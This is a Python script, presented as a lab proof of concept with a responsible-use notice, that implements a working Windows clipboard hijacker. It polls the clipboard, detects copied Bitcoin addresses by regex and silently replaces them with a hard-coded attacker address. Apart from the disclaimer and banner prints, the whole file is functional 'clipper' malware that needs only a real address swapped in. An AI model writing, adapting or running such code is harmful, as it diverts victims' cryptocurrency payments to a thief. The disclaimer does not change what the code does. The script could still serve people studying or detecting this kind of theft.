"""
⚠️  RESPONSIBLE USE NOTICE
This script simulates a clipboard-hijacking attacker for demonstration and
testing purposes only. Run it ONLY on your own local machine or an isolated
lab VM you control. Do not run it against any system you don't own or have
explicit permission to test.
"""

import time
import re
import win32clipboard

ATTACKER_BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
BTC_PATTERN = re.compile(
    r"^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-Z0-9]{38,59})$"
)

POLL_INTERVAL_SECONDS = 0.5


def _read_clipboard_text():
    """Open, read, and ALWAYS close the clipboard, even on error."""
    win32clipboard.OpenClipboard()
    try:
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            return win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        return None
    finally:
        win32clipboard.CloseClipboard()


def _write_clipboard_text(text: str):
    """Open, write, and ALWAYS close the clipboard, even on error."""
    win32clipboard.OpenClipboard()
    try:
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
    finally:
        win32clipboard.CloseClipboard()


def start_poc_attacker():
    print("=" * 60)
    print("⚠️  PoC ATTACKER — lab/local testing only. See notice above.")
    print("=" * 60)
    print("[+] PoC Attacker active. Watching clipboard...")

    last_seen = ""
    while True:
        try:
            data = _read_clipboard_text()
        except Exception as e:
            
            print(f"[debug] clipboard read skipped: {e}")
            time.sleep(POLL_INTERVAL_SECONDS)
            continue

        if data and data != last_seen:
            last_seen = data
            stripped = data.strip()
            if BTC_PATTERN.match(stripped) and stripped != ATTACKER_BTC:
                print(f"[!] Target BTC Address Copied: {data}")
                print("[!] Hijacking Clipboard with Attacker's Address...")
                try:
                    _write_clipboard_text(ATTACKER_BTC)
                    last_seen = ATTACKER_BTC
                except Exception as e:
                    print(f"[debug] clipboard write failed, will retry: {e}")

        time.sleep(POLL_INTERVAL_SECONDS)


if __name__ == "__main__":
    try:
        start_poc_attacker()
    except KeyboardInterrupt:
        print("\n[+] PoC Attacker stopped.")